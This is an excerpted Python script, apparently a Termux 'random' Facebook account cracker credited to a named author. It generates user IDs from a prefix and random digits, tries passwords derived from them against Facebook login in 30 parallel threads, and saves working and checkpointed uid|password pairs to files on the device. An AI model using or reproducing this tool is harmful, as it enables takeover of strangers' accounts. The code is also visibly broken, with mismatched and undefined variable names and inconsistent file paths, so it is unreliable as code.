...
sys.stdout.write('\x1b[1;35m\x1b]2;🌹🌻🍂💛Mahibcd 🙂💗 \x07')

try:os.mkdir('/sdcard/bcd')
except:pass
...
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : Mahi Khan
 \033[1;97m[\033[1;92m•\033[1;97m] Facebook : https://www.facebook.com/Mahi.khan03117
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : https://github.com/MahiXyz
...
def menu():
    ...
    linex()
    Mahibcd = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option : ")
    if younisxyz in ['1','01']:
        random_number()
    elif younisxyz in ['2','02']:
        os.system("xdg-open https://youtube.com/@Sameerkhan-wn8gl?si=tO4rWrRgqYvlJjMx")
        time.sleep(3)
        menu()
    elif younisxyz in ['3','03']:
    	os.system("xdg-open https://www.facebook.com/Mahi.khan03117");time.sleep(3);menu()
    else:
...
def random_number():
    ...
    for _ in range(limit):
        ...
        idz.append(x)
    with ThreadPoolExecutor(max_workers=30) as bcd:
        clear()
        ...
        for xyz in idz:
            uid = code+bcd
            pww = [bcd,uid] 
            BCD.submit(crack, uid, pww, total_idz)
    linex()
    ...
    try:
        for pw in pww:
            ...
            if "session_key" in po:
                print(f"\r\033[1;92m [bcd-OK] {uid} | {pw}")
                open("/sdcard/bcd/RANDOM_OK.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in po["error"]["message"]:
                cpclr = random.choice(["\033[1;90m","\033[1;91m","\x1b[38;5;205m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
                print(f"\r{cpclr} [bcd-CP] {uid} | {pw}")
                open("/sdcard/Mahibcd/RANDOM_CP.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid)
                break
            else:
                continue
